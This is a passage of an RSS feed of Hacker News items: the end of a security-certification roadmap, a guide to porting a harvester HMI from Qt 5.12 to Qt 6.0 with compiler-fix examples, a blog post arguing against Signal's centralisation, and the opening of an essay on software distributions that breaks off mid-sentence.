<li><p><a target="_blank" href="https://elearnsecurity.com/product/ejpt-certification/"> eLearnSecurity Junior Penetration
</a> is designed for students with no penetration testing experience, as shown in course content, the instructor’s mode of teaching, and the lab modules. The course teaches about practical skill-sets that are important to penetration testing such as networking knowledge, scripting/programming, vulnerability identification, etc. It has a fairly great structure and is delivered in the easiest way to understand. Although you can proceed to the certification without the course, it is still very recommended you take the course.</p>
</li>
<li><p><a target="_blank" href="https://www.offensive-security.com/pwk-oscp/OSCP/">Offensive Security Certified Professional</a>  is an ethical hacking certification offered by Offensive Security that teaches penetration testing methodologies and the use of the tools included with the Kali Linux distribution (successor of BackTrack). The OSCP is a hands-on penetration testing certification, requiring holders to successfully attack and penetrate various live machines in a safe lab environment.</p>
</li>
<li><p><a target="_blank" href="https://elearnsecurity.com/product/ecpptv2-certification/">eLearnSecurity’s Certified Professional Penetration Tester</a>  is a comprehensive, “black box” engagement against a given scope. You have seven days to complete the engagement, and another seven days to complete a professional penetration test report. </p>
</li>
<li><p><a target="_blank" href="https://www.offensive-security.com/courses-and-certifications/">Offensive Security Certified Expert</a>  is a 48-hour lab examination that will thoroughly test you on web exploitation, Windows exploit development, anti-virus evasion, x86 assembly, handcrafting shellcode, and more</p>
</li>
<li><p><a target="_blank" href="https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/">Certified Ethical Hacker (CEH)</a>  is a qualification obtained by demonstrating knowledge of assessing the security of computer systems by looking for weaknesses and vulnerabilities in target systems, using the same knowledge and tools as a malicious hacker, but in a lawful and legitimate manner to assess the security posture of a target system.</p>
</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Cyber Security is one of the most expensive fields, You are required to do a number of exams and certification. Unlike Software Development, These certifications are very crucial, They are more or less like a "Get out of jail free" Card.</p>
<p>Thanks for coming this far with me, I might be writing soon on preparatory exams for the above certifications</p>
<p>References:
<a href="https://medium.com/cybersecpadawan/ecppt-certified-a95fc842ca7b" target="_blank">medium.com/cybersecpadawan/ecppt-certified-..</a>
Wikipedia</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.ashimi.xyz/cyber-security-beginner-roadmap-ckk1cmmvb08jfqps1amjuh10o</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812025</guid>
            <pubDate>Sun, 17 Jan 2021 16:26:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Noom's unusual – but stupid effective – 9-figure marketing strategy]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811970">thread link</a>) | @PeteBoyle
<br/>
January 17, 2021 | https://have-a-word.com/noom-marketing | <a href="https://web.archive.org/web/*/https://have-a-word.com/noom-marketing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://have-a-word.com/noom-marketing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811970</guid>
            <pubDate>Sun, 17 Jan 2021 16:21:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If it weren't for those meddling cryptographers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811809">thread link</a>) | @baobabKoodaa
<br/>
January 17, 2021 | https://www.attejuvonen.fi/meddling-cryptographers/ | <a href="https://web.archive.org/web/*/https://www.attejuvonen.fi/meddling-cryptographers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.attejuvonen.fi/meddling-cryptographers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811809</guid>
            <pubDate>Sun, 17 Jan 2021 16:07:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Another scam paper published in a “scientific” journal]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 45 (<a href="https://news.ycombinator.com/item?id=25811802">thread link</a>) | @DanielBMarkham
<br/>
January 17, 2021 | https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/ | <a href="https://web.archive.org/web/*/https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811802</guid>
            <pubDate>Sun, 17 Jan 2021 16:06:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating a Harvester HMI from Qt 5.12 to Qt 6.0]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811697">thread link</a>) | @todsacerdoti
<br/>
January 17, 2021 | https://embeddeduse.com/2021/01/17/migrating-a-harvester-hmi-from-qt-5-12-to-qt-6-0/ | <a href="https://web.archive.org/web/*/https://embeddeduse.com/2021/01/17/migrating-a-harvester-hmi-from-qt-5-12-to-qt-6-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>December 2020 saw the launch of Qt 6 – the first new major version since 2012. I wanted to find out how fit Qt 6.0 is for Qt embedded systems. I took the driver terminal of the <a href="https://embeddeduse.com/2019/11/06/qt-controller-area-networks-talk-qtws19/">ROPA sugar beet harvesters</a> and migrated it from Qt 5.12 to Qt 6.0 as a side project. The migration was smooth, but incomplete. The driver terminal uses the Qt modules Multimedia and SerialBus, which haven’t been ported to Qt 6 yet. An update of the driver terminal would have to wait at least until the end of 2021, when Qt 6.2 will finally be feature-complete.</p>



<h2>Introduction</h2>



<p>The migration to Qt 6 is my 5th Qt migration. The migrations from Qt 1 to Qt 2, from Qt 2 to Qt 3 and from Qt 4 to Qt 5 were fairly smooth. The migration of an IDE for formal verification and of the driver terminal of a forage harvester were a matter of 2-3 days. The migration from Qt 3 to Qt 4 was extremely painful. Migrating an IDE for Bluetooth development took me 6 months. </p>



<p>I was curious how long I would need to migrate the driver terminal of a <a href="https://embeddeduse.com/2019/11/06/qt-controller-area-networks-talk-qtws19/">sugar beet harvester</a> from Qt 5.12 to Qt 6.0. The driver terminal has 350 source files (.cpp, .h, .qml) with 50K lines of hand-written code. It also has 45 source files with 74K lines of generated code for the terminal-machine communication. </p>



<p>The guide <a href="https://doc.qt.io/qt-6/portingguide.html">Porting to Qt 6</a> from the official Qt documentation is the starting point for the migration. It suggests to port the application to Qt 5.15 in a first step and to Qt 6.0 in a second step. The Qt developers made the APIs of Qt 5.15 as similar as possible to the APIs of Qt 6.0 to reduce the migration efforts.</p>



<p>I’ll describe step by step how to change the CMake files, how to fix the warnings and errors flagged by the C++ compiler, how to find the QML incompatibilities and how to set up the development environment for Qt 6.0.</p>



<h2>Migrating from Qt 5.12 to Qt 5.15</h2>



<p>The harvester application runs with Qt 5.12. We install Qt 5.15.2 and QtCreator 4.13 on our development PC. The PC should run Ubuntu 16.04 or newer.</p>



<h3>C++ Compiler Warnings and Errors</h3>



<p>The harvester application consists of three CMake projects: the executable <code>Main</code>, the library <code>Hmi</code> and the library <code>Can</code>. We switch on the deprecation warnings by adding the line</p>



<pre><code>target_compile_definitions(${PROJECT_NAME} PUBLIC 
    "QT_DISABLE_DEPRECATED_BEFORE=0x050F00")</code></pre>



<p>to the <code>CMakeLists.txt</code> of each project. This macro triggers a warning for every function that is deprecated in Qt 5.15 or older. Sometimes the use of a deprecated function causes an error. The next subsections list the C++ compiler warnings and errors I encountered while migrating the harvester application from Qt 5.12 to Qt 5.15.</p>



<p>The documentation page <a href="https://doc.qt.io/qt-5/obsoleteclasses.html">Obsolete Classes</a> lists all the classes that may be removed in future releases and all the classes with functions that may be removed in future releases. The documentation often gives a hint how to replace an obsolete class or function.</p>



<h4>Error/Warning: ‘endl’ is deprecated: Use Qt::endl</h4>



<p><em>Problem</em>:</p>



<pre><code>QTextStream os(&amp;dbFile);
os &lt;&lt; QStringLiteral("[access]") &lt;&lt; <strong>endl</strong>;</code></pre>



<p>Most occurrences of <code>endl</code> triggered the warning: <code>'endl' is deprecated: Use Qt::endl</code>. Some occurrences triggered an error: <code>‘endl’ was not declared in this scope</code>. The compiler couldn’t distinguish between <code>std::endl</code> and <code>Qt::endl</code>.</p>



<p><em>Fix</em>:</p>



<pre><code>QTextStream os(&amp;dbFile);</code>
os &lt;&lt; QStringLiteral("[access]") &lt;&lt; <strong>Qt::endl</strong>;</pre>



<p>We  replace each occurrence of <code>endl</code> by <code>Qt::endl</code>. All stream manipulators are now prefixed with the Qt namespace: for example, <code>Qt::hex</code>, <code>Qt::fixed</code>, <code>Qt::left</code> and <code>Qt::ws</code>.</p>



<h4>Error: ‘longMonthName’ is not a member of ‘QDate’</h4>



<p><em>Problem</em>:</p>



<pre>return QDate::longMonthName(i, <strong>QDate::StandaloneFormat</strong>);</pre>



<p>The static function <code>QDate::longMonthName</code> was removed from <code>QDate</code>.</p>



<p><em>Fix</em>: </p>



<pre id="block-e92f5df0-ab5d-4d07-8977-15b1a6d4d5b3">return QLocale().monthName(i);</pre>



<p>The documentation of <code>QDate::longMonthName</code> hints at <code>QLocale</code> for a replacement. <code>QLocale::monthName</code> returns the long month name by default.</p>



<h4>Error: no matching function for call to ‘QProcess::execute(const char [10])’</h4>



<p><em>Problem</em>:</p>



<pre><code>QProcess::execute(<strong>"/bin/sync"</strong>);</code></pre>



<p>The variant of <code>QProcess::execute</code> with the command as its only argument was removed.</p>



<p><em>Fix</em>:</p>



<pre><code>QProcess::execute(<strong>"/bin/sync", {}</strong>);</code></pre>



<p>We must always use the two-argument variant, where the second argument is a <code>QStringList</code> with the options and arguments of the command. As <code>sync</code> doesn’t have any arguments or options, the second argument is the empty list.</p>



<h4>Error: ‘mapped’ is not a member of ‘QSignalMapper’</h4>



<p><strong><em>Problem</em></strong>:</p>



<pre><code><strong>using MappedSignal = void(QSignalMapper::*)(int);</strong>
connect(&amp;m_impl-&gt;m_signalMapper, 
        <strong>static_cast&lt;MappedSignal&gt;(&amp;QSignalMapper::mapped)</strong>,
        m_impl.data(),
        &amp;DriverModel::Impl::onDriverChanged);</code></pre>



<p>Before Qt 5.15, <code>QSignalMapper::mapped</code> had an overload for each of the four types of the single argument: <code>QObject*</code>, <code>QWidget*</code>, <code>const QString&amp;</code> and <code>int</code>. We had to tell the compiler with a <code>static_cast</code> which overload to use in the connect statements. The overloads are obsolete in Qt 5.15.</p>



<p><em>Fix</em>:</p>



<pre><code>connect(&amp;m_impl-&gt;m_signalMapper, <strong>&amp;QSignalMapper::mappedInt</strong>,
        m_impl.data(), &amp;DriverModel::Impl::onDriverChanged);</code></pre>



<p>From Qt 5.15, the four overloads have different names <code>mappedInt</code>, <code>mappedObject</code>, <code>mappedString</code> and <code>mappedWidget</code>. This eliminates the cast and makes the code simpler.</p>



<h4>Error: no member named ‘insertMulti’ in ‘QMap &gt;’</h4>



<p><em>Problem</em>:</p>



<pre><code><strong>QMap</strong>&lt;int, std::function&lt;void()&gt;&gt; importCalls;
importCalls.<strong>insertMulti</strong>(0, [this, path](
    {m_customerModel.importCsvFile(path);});</code></pre>



<p>Before Qt 5.15, <code>QMap</code> distinguished between maps and multi-maps by <code>insert</code> and <code>insertMulti</code>.</p>



<p><em>Fix</em>:</p>



<pre><code><strong>QMultiMap</strong>&lt;int, std::function&lt;void()&gt;&gt; importCalls;
importCalls.<strong>insert</strong>(0, [this, path](
    {m_customerModel.importCsvFile(path);});</code></pre>



<p>Qt 5.15 introduces a new class <code>QMultiMap</code>, which inherits from <code>QMap</code>. We insert elements into a <code>QMultiMap</code> with <code>insert</code> now.</p>



<h4>Error/Warning: ‘QString::SplitBehavior’ has not been declared</h4>



<p><em>Problem</em>:</p>



<pre><code>auto nameParts = customer-&gt;name()
    .split(' ', <strong>QString::SkipEmptyParts</strong>);</code></pre>



<p>Like many other enum constants, <code>QString::SkipEmptyParts</code> was moved into the namespace <code>Qt</code>. The problem often occurs as a warning: </p>



<pre><code>‘... QString::split ...’ is deprecated: Use Qt::SplitBehavior variant instead [-Wdeprecated-declarations]</code></pre>



<p><em>Fix</em>:</p>



<pre><code>auto nameParts = customer-&gt;name()
    .split(' ', <strong>Qt::SkipEmptyParts</strong>);</code></pre>



<p>The warning tells us what to do. We replace <code>QString::SplitBehavior</code> by <code>Qt::SplitBehavior</code>.</p>



<h4>Error: call of overloaded ‘append()’ is ambiguous</h4>



<p><em>Problem</em>:</p>



<pre><code>QVector&lt;QPair&lt;QString, QString&gt;&gt; m_counterCats;
m_counterCats.<strong>append({"Gesamt", ""})</strong>;</code></pre>



<p><code>QVector&lt;T&gt;::append</code> has gained a third overload for rvalue references <code>T&amp;&amp;</code> in addition to the existing <code>const T&amp;</code> and <code>const QVector&lt;T&gt;&amp;</code>. The C++17 compiler cannot distinguish between these three overloads.</p>



<p><em>Fix</em>:</p>



<pre><code>QVector&lt;QPair&lt;QString, QString&gt;&gt; m_counterCats;
m_counterCats.<strong>append(QPair&lt;QString, QString&gt;{"Gesamt", ""});</strong></code></pre>



<p>We must help the C++17 compiler by spelling out the type of the appended element.</p>



<h3>QML Runtime Errors</h3>



<p>Unfortunately, we don’t have a friendly compiler telling us which lines of our QML code are deprecated. The documentation page <a href="https://doc.qt.io/qt-5/obsoleteqmltypes.html">Obsolete QML Types</a> lists the known obsolete types, properties and methods. It’s worth going through these lists and checking our QML code for problems. I didn’t find any problems in the harvester QML code.</p>



<p>Before we test the most common usage scenarios (hopefully in an automated way), we update the versions in the <code>import</code> statements. I had to perform the following replacements in the QML files.</p>



<pre><code><strong>Qt 5.12</strong>                      <strong>-&gt;  Qt 5.15</strong>
import QtQuick 2.10          -&gt;  import QtQuick 2.15
import QtQuick.Controls 2.3  -&gt;  import QtQuick.Controls 2.15
import QtMultimedia 5.8      -&gt;  import QtMultimedia 5.15</code></pre>



<p>In my case, testing the most common usage scenarios unearthed a single problem about signal handlers or slots in <code>Connections</code> types.</p>



<h4>Warning: QML Connections: Implicitly defined onFoo properties in Connections are deprecated</h4>



<p><em>Problem</em>:</p>



<pre><code>Connections {
    target: csvExportModel
    <strong>onMessageOccurred</strong>: messagePane.text = message
}</code></pre>



<p>The signal handler <code>onMessageOccurred</code> is implicitly defined as a function.</p>



<p><em>Fix</em>:</p>



<pre><code>Connections {
    target: csvExportModel
    <strong>function onMessageOccurred(message)</strong>
    {
        messagePane.text = message
    }
}</code></pre>



<p>We must define <code>onMessageOccurred</code> as a function explicitly with an argument list.</p>



<h2>Migrating from Qt 5.15 to Qt 6.0</h2>



<p>I installed QtCreator 4.14, as it is the first release that <a href="https://www.qt.io/blog/qt-creator-4.14-released">fully supports Qt 6</a>. QtCreator 4.14 adds proper syntax highlighting for Qt 6 code and some improvements for CMake. My development PC ran Ubuntu 18.04.</p>



<p>When I installed Qt 6.0 with the online installer, I encountered this error:</p>



<figure><a href="https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?ssl=1"><img loading="lazy" width="500" height="294" src="https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?resize=500%2C294&amp;ssl=1" alt="" srcset="https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?w=500&amp;ssl=1 500w, https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?resize=300%2C176&amp;ssl=1 300w" sizes="(max-width: 500px) 100vw, 500px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?w=500&amp;ssl=1 500w, https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?resize=300%2C176&amp;ssl=1 300w" data-lazy-src="https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?resize=500%2C294&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure>



<p>My Internet search lead me to <a href="https://bugreports.qt.io/browse/QTBUG-89218">QTBUG-89218</a>. The comment section reveals that Ubuntu 18.04 is not a <a href="https://www.qt.io/blog/qt6-development-hosts-and-targets">supported development platform</a> any more. We have two options. We can upgrade to Ubuntu 20.04 or newer or we can build Qt 6.0 from sources. If our application uses one of the Qt modules not yet ported to Qt 6 (e.g., QtSerialBus, QtMultimedia, QtWebEngine), we will have to <a href="https://wiki.qt.io/Building_Qt_6_from_Git">build Qt 6.0 from sources</a> any way and port the missing module to Qt 6.0. I ended up doing both.</p>



<h3>Building with CMake</h3>



<h4>Updating CMakeLists.txt Files</h4>



<p>The <code>CMakeLists.txt</code> files refer to Qt 5 explicitly in <code>find_package</code> and <code>target_link_libraries</code> commands.</p>



<pre><code>find_package(<strong>Qt5</strong> COMPONENTS Core Gui Qml REQUIRED)
target_link_libraries(${PROJECT_NAME}
  Ag::Can Ag::Hmi <strong>Qt5</strong>::Core <strong>Qt5</strong>::Gui <strong>Qt5</strong>::Qml
)</code></pre>



<p>We must change Qt 5 to Qt 6.</p>



<pre><code>find_package(<strong>Qt6</strong> COMPONENTS Core Gui Qml REQUIRED)
target_link_libraries(${PROJECT_NAME}
  Ag::Can Ag::Hmi <strong>Qt6</strong>::Core <strong>Qt6</strong>::Gui <strong>Qt6</strong>::Qml
)</code></pre>



<p>Qt5 was built on C++11. The top-level <code>CMakeLists.txt</code> file contained the following lines.</p>



<pre><code>set(CMAKE_CXX_STANDARD <strong>11</strong>)
set(CMAKE_CXX_STANDARD_REQUIRED ON)</code></pre>



<p>Qt6 requires C++17. We must change the top-level <code>CMakeLists.txt</code> file accordingly.</p>



<pre><code>set(CMAKE_CXX_STANDARD <strong>17</strong>)
set(CMAKE_CXX_STANDARD_REQUIRED ON)</code></pre>



<h4>Setting Up the QtCreator Kit</h4>



<p>When I started QtCreator 4.14 …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://embeddeduse.com/2021/01/17/migrating-a-harvester-hmi-from-qt-5-12-to-qt-6-0/">https://embeddeduse.com/2021/01/17/migrating-a-harvester-hmi-from-qt-5-12-to-qt-6-0/</a></em></p>]]>
            </description>
            <link>https://embeddeduse.com/2021/01/17/migrating-a-harvester-hmi-from-qt-5-12-to-qt-6-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811697</guid>
            <pubDate>Sun, 17 Jan 2021 15:56:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We can do better than Signal]]>
            </title>
            <description>
<![CDATA[
Score 168 | Comments 278 (<a href="https://news.ycombinator.com/item?id=25811696">thread link</a>) | @icy
<br/>
January 17, 2021 | https://icyphox.sh/blog/signal/ | <a href="https://web.archive.org/web/*/https://icyphox.sh/blog/signal/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <header>
            <section>
<a href="https://icyphox.sh/">
<img src="https://d33wubrfki0l68.cloudfront.net/f294b31af19b6fafcede07b76eac214e9a381be7/5c724/static/white.svg" alt="icyphox's avatar">
</a>
</section>

          </header>
          <!--<section style="float: right">
            view in <a href="/txt/signal.txt">plain-text</a>
          </section>-->
          <section>
            17 January, 2021
          </section>
          <article>
            
            <h2>Centralized silos are never the solution</h2>
            <p>Signal is possibly the most recommended pro-privacy instant
communication app — one that was commonplace in the hacker community,
and has now gained a lot of mainstream traction, thanks to WhatsApp
deciding to screw its userbase over. It certainly presents a more
compelling alternative than others in the same space, like WhatsApp
itself, Telegram, etc. They engineered the <a href="https://en.wikipedia.org/wiki/Signal_Protocol" rel="nofollow">Signal
Protocol</a>, which has
found its way into other messaging systems, and has been the base for
the likes of OMEMO and Matrix.<sup id="fnref:1"><a href="#fn:1">1</a></sup> While I admire the tech behind
Signal, I still believe we can do better, and we ought to.</p>

<p>I have a few gripes with Signal — the biggest of them all is it’s
centralized, and in the US no less. This alone makes it not that
different from WhatsApp — we’re simply moving from one silo to another.
What’s to say that Signal will uphold its values, continue operating
<em>and</em> evade censorship and potential compromise? To top it off, they’re
becoming a fairly high value target off late. And if that isn’t
convincing enough, Signal’s massive outage lasting nearly a day<sup id="fnref:2"><a href="#fn:2">2</a></sup>
should be enough evidence against centralization. Further, Signal is
known to use AWS<sup id="fnref:3"><a href="#fn:3">3</a></sup> as their cloud provider — what if another
Parler<sup id="fnref:4"><a href="#fn:4">4</a></sup> happens and the rug is pulled from under Signal’s feet?</p>

<p>A common defense in favor of Signal is, “But it’s all open source!”.
Sure is, but on what basis do I trust them? I don’t mean to sound
conspiratorial, but what’s to say that the server in production hasn’t
been backdoored? In fact, the <a href="https://github.com/signalapp/Signal-Server" rel="nofollow">Signal server
code</a> hasn’t even been
updated since April 2020. You’re telling me it’s undergone <em>no</em> changes?</p>

<p>Another response I usually see is “But Signal is all we have!”. While
that is somewhat true — at least by the metric of “secure messengers
your granny can use”, there are some promising alternatives who are
especially focused on decentralizing E2EE communications.</p>

<ol>
<li><a href="https://matrix.org/" rel="nofollow">Matrix</a>: Matrix has improved a whole lot, and I
like that they’re working to disprove that end-to-end encryption
cannot be decentralized<sup id="fnref:5"><a href="#fn:5">5</a></sup>.</li>
<li><a href="https://getsession.org/" rel="nofollow">Session</a>: While it involves some cryptoshit,
and hasn’t been verified yet, it’s an interesting alternative to keep
an eye out for.</li>
</ol>

<p>All things said, Signal is the shiniest turd we have — it fits most
threat models, and does the job alright; I will continue to use it.
However, here’s something to think about: while privacy preserving tech
is commendable, does it have to come at the cost of user freedoms? Hint:
it doesn’t, and it shouldn’t.</p>


 
          </article>
          <p>Questions or comments? 
          Send an email to 
          <a href="mailto:~icyphox/x@lists.sr.ht?Subject=Re:%20We%20can%20do%20better%20than%20Signal">~icyphox/x@lists.sr.ht</a>—my <a href="https://lists.sr.ht/~icyphox/x">public inbox</a>.</p>
        </div></div>]]>
            </description>
            <link>https://icyphox.sh/blog/signal/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811696</guid>
            <pubDate>Sun, 17 Jan 2021 15:55:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software Distributions and Their Roles Today]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25811596">thread link</a>) | @nwotnagrom
<br/>
January 17, 2021 | https://venam.nixers.net/blog/unix/2020/03/29/distro-pkgs.html | <a href="https://web.archive.org/web/*/https://venam.nixers.net/blog/unix/2020/03/29/distro-pkgs.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    <p><img src="https://venam.nixers.net/blog/assets/mailroom.jpg" alt="Mailroom" loading="lazy"></p>

<p><em>NB</em>: This is a repost on this blog of a post made on <a href="https://nixers.net/showthread.php?tid=2192">nixers.net</a></p>

<h2 id="what-is-a-distribution">What is a distribution</h2>

<p>What are software distributions? You may think you know everything there
is to know about the term software distribution, but take a moment to
think about it, take a step back and try to see the big picture.</p>

<p>We often have in mind the thousands of Linux distributions when we hear
it, however, this is far from limited to Linux, BSD, Berkeley Software
Distribution, has software distribution right in the name. Android,
and iOS are software distributions too.</p>

<p>Actually, it’s so prevalent, we may have stopped paying attention to
the concept. We find it hard to put a definition together.<br>
There’s definitely the part about distributing software in it. Software
that may be commercial or not, open source or not.<br>
To understand it better maybe investigating what problems software
distributions address would clear things up.</p>

<p>Let’s imagine a world before software distributions, does that world
exist? A world where software stays within boundaries, not shared with anyone
outside.<br>
Once we break these boundaries, and we want to share it, we’ll find that we
have to package all the software together meaningfully, configure
them so that they work well together, adding some glue in between when
necessary, find the appropriate medium to distribute the bundle, get
it all from one end to another safely, make sure it installs properly,
and follow up on it.</p>

<p>Thus, software distribution is about the mechanism and the community
that takes the burden and decisions to build an assemblage of coherent
software that can be shipped.</p>

<p>The operating system, or kernel if you like, could be, and is often,
part of the collage offered, a software just like others.</p>

<p>The people behind it are called distribution maintainers, or package
maintainers. Their role vary widely, they could write the software that
stores all the packages called the repository, maintain a package manager
with its format, maintain a full operating system installer, package and
upload software they built or that someone else built on a specific time
frame/life cycle, make sure there aren’t any malicious code uploaded on
the repository, follow up on the latest security issues and bug reports,
fix third party software to fit the distribution philosophical choices
and configurations, and most importantly test, plan, and make sure
everything holds up together.<br>
These maintainers are the source of trust of the distribution, they
take responsibility for it. In fact, I think it’s more accurate to call
them distributors.</p>

<ul>
  <li><a href="#target-and-speciality">Target And Speciality</a></li>
  <li><a href="#the-layering">The Layering</a></li>
  <li><a href="#stable-releases-vs-rolling">Releases vs Rolling</a></li>
  <li><a href="#interdistribution-standard">Interdistribution Standard</a></li>
  <li><a href="#method-of-distribution">Medthod of Distribution</a></li>
  <li><a href="#format">Packages Format</a></li>
  <li><a href="#resolving-dependencies">Resolving Dependencies</a></li>
  <li><a href="#versioning">Versioning</a></li>
  <li><a href="#static-vs-dynamic-linking">Static vs Dynamic Linking</a></li>
  <li><a href="#reproducibility">Reproducibility</a></li>
  <li><a href="#stateless-and-verifiable-systems">Stateless and Verifiable Systems</a></li>
  <li><a href="#do-distros-matter-with-containers-virtualisation-and-specific-and-universal-package-managers">Do Distros Matter With Containers, Virtualisation, and Specific and Universal Package Managers</a></li>
  <li><a href="#if-packages-are-self-contained">If Packages Are Self-Contained</a></li>
  <li><a href="#programming-language-package-management-specific">Programming language package management specific</a></li>
  <li><a href="#going-distro-less">Going Distro-less</a></li>
</ul>

<h2 id="different-ways-to-approach-it">Different ways to approach it</h2>

<p>There’s so many distributions it can make your head spin. The software
world is booming, especially the open source one. For instance, we can
find bifurcations of distributions that get copied by new maintainers
and divert. This creates a tree like aspect, a genealogy of both common
ancestors and/or influences in technical and philosophical choices.<br>
Overall, we now have a vibrant ecosystem where a thing learned on a
branch can help a completely unrelated leaf on another tree. There’s
something for everyone.</p>

<h3 id="target-and-speciality">Target and speciality</h3>

<p>So what could be so different between all those software distributions,
why not have a single platform that everyone can build on.</p>

<p>One thing is specialization and differentiation. Each distro caters to
a different audience and is built by a community with its philosophy.</p>

<p>Let’s go over some of them:</p>

<ul>
  <li>A distribution can support specific sets and combinations of hardware:
from CPU ISA to peripherals drivers</li>
  <li>A distribution may be specifically optimized for a type of environment:
Be it desktop, portable mobile device, servers, warehouse size computers,
embedded devices, virtualised environment, etc.</li>
  <li>A distribution can be commercially backed or not</li>
  <li>A distribution can be designed for different levels of knowledge in a
domain, professional or not. For instance, security research, scientific
computing, music production, multimedia box, HUD in cars, mobile device
interface, etc.</li>
  <li>A distribution might have been certified to follow certain standards
that need to be adhered to in professional settings, for example security
standards and hardening</li>
  <li>A distribution may have a single purpose in a commodity machine,
specific machine functionalities such as firewall, a computer cluster,
a router, etc.</li>
</ul>

<p>That all comes to the raison d’être, the philosophy of the distribution,
it guides every decision the maintainers have to make. It guides how they
configure every software, how they think about security, portability,
comprehensiveness.</p>

<p>For example, if a distribution cares about free software, it’s going to
be strict about what software it includes and what licenses it allows
in its repository, having software to check the consistency of licenses
in the core.<br>
Another example is if their goal is to target a desktop audience then
internationalization, ease of use, user-friendliness, numerous
packages, is going to be prioritized. While, again, if the
target is a real time embedded device, the size of the kernel is going
to be small, configured and optimized for this purpose, and limiting and
choosing the appropriate packages that work in this environment. Or if
it’s targeted at advanced users that love having control of their machine,
the maintainers will choose to let the users make most of the decisions,
providing as many packages as possible with the latest version possible,
with a loose way to install the distribution, having a lot of libraries
and software development tools.</p>

<p>What this means is that a distribution does anything it can to provide
sane defaults that fit its mindset. It composes and configures a layer
of components, a stack of software.</p>

<h3 id="the-layering">The layering</h3>

<p>Distribution maintainers often have at their disposition different blocks
and the ability to choose them, stacking them to create a unit we call a
software distribution. There’s a range of approaches to this, they could
choose to have more, or less, included in what they consider the <em>core</em> of
the distribution and what is externally less important to it.<br>
Moreover, sometimes they might even leave the core very small and loose,
instead providing the glue software that makes it easy for the users
to choose and swap the blocks at specific stages in time: installation,
run time, maintenance mode, etc.</p>

<p>So what are those blocks of interdependent components.</p>

<p>The first part is the method of installation, this is what everything
hinges on, the starting point.</p>

<p>The second part is the kernel, the real core of all operating systems
today. But that doesn’t mean that the distribution has to enforce
it. Some distributions may go as far as to provide multiple kernels
specialised in different things or none at all.</p>

<p>The third part is the filesystem and file hierarchy, the component that
manages where and how files are spread out on the physical or virtual
hardware. This could be a mix and match where sections of the file system
tree are stored on separate filesystems.</p>

<p>The fourth part is the init system, PID 1. This choice has generated
a lot of contention these days. PID 1 being the mother process of all
other processes on the system. What role it has and what functionalities
it should include is a subject of debate.</p>

<p>The fifth part is composed of the shell utilities, what we sometimes
refer to as the userland or user space, as it’s the first layer the user
can directly interface with to have control of the operating system, the
place where processes run. The userland implementations on Unix-based
systems usually tries to follow the POSIX standard. There are many such
implementations, also subject of contention.</p>

<p>The sixth part is made up of services and their management. The daemons,
long-running processes that keep the system in order. Many argue if the
management functionality should be part of the init system or not.</p>

<p>The seventh part is documentation. Often it is forgotten but it is still
very important.</p>

<p>The last part is about everything else, all the user interfaces and
utilities a user can have and ways to manage them on the system.</p>

<h3 id="stable-releases-vs-rolling">Stable releases vs Rolling</h3>

<p>There exists a spectrum on which distributions place themselves when
it comes to keeping up to date with the versions of the software they
provide. This most often applies to external third party open source
software.<br>
The spectrum is the following: Do we allow the users to always have the
latest version of every software while running the risk of accidentally
breaking their system, what we call bleeding edge or rolling distro, or
do we take a more conservative approach and take the time to test every
software properly before allowing it in the repository, while not having
all the latest updates, features, and optimizations of the software,
what we call release based distro.</p>

<p><strong>NB</strong>: Keep in mind that this isn’t about the software version from the
developer’s perspective but the upstream/packaged software version from
the maintainers’ perspective. The distinction lies in the selection that
package maintainers make: will their upstream changes directly affect
all users and changes “roll” downstream, or are users able to select
